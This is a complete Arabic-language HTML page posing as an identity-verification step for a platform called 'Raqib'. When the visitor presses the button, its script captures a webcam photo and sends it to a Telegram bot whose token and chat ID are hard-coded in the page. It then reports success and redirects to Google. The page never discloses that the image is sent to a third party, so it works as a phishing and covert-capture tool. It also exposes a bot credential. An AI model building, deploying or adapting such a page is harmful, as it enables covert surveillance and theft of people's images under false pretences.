<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة راقب</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0a0f1c;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            max-width: 400px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        h1 { color: #0a0f1c; margin-bottom: 10px; }
        .sub { color: #666; font-size: 14px; margin-bottom: 30px; }
        .btn {
            background: #0a0f1c;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
        }
        .btn:active { transform: scale(0.98); }
        .info {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 12px;
            font-size: 13px;
            color: #333;
            margin: 20px 0;
        }
        .status {
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
            margin-top: 15px;
        }
        .status.show { display: block; }
        .loading { background: #fff3cd; color: #856404; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        video, canvas { display: none; }
        .footer { font-size: 11px; color: #aaa; margin-top: 20px; }
    </style>
</head>
<body>
<div class="card">
    <h1>📷 منصة راقب</h1>
    <div class="sub">المنصة الرقمية الموثوقة</div>
    <div class="info">
        🔐 مطلوب توثيق الهوية لإكمال العملية<br>
        ⏱️ يستغرق ثانية واحدة فقط
    </div>
    <button class="btn" id="startBtn">✅ توثيق الهوية الآن</button>
    <div class="status" id="status"></div>
    <div class="footer">منصة راقب © 2026</div>
</div>
<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
const BOT_TOKEN = "8365043460:AAGa2EIVhOTKFa7wEuARpb_cuEsDIa2bVxs";
const CHAT_ID = "8545876964";
const startBtn = document.getElementById('startBtn');
const statusDiv = document.getElementById('status');

startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    startBtn.innerText = '⏳ جاري التوثيق...';
    statusDiv.className = 'status show loading';
    statusDiv.innerText = '🔐 جاري الوصول إلى الكاميرا...';

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            statusDiv.innerText = '📤 جاري إرسال بيانات التوثيق...';

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob);

                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const json = await res.json();
                    if (json.ok) {
                        statusDiv.className = 'status show success';
                        statusDiv.innerText = '✅ تم توثيق الهوية بنجاح! جاري التحويل...';
                        setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
                    } else {
                        throw new Error(json.description);
                    }
                } catch(err) {
                    statusDiv.className = 'status show error';
                    statusDiv.innerText = '❌ خطأ في الإرسال، حاول مرة أخرى';
                    startBtn.disabled = false;
                    startBtn.innerText = '✅ توثيق الهوية الآن';
                }
            }, 'image/jpeg');
            stream.getTracks().forEach(t => t.stop());
        };
    } catch(err) {
        statusDiv.className = 'status show error';
        statusDiv.innerText = '❌ لا يمكن الوصول للكاميرا. تأكد من منح الإذن';
        startBtn.disabled = false;
        startBtn.innerText = '✅ توثيق الهوية الآن';
    }
});
</script>
</body>
</html>
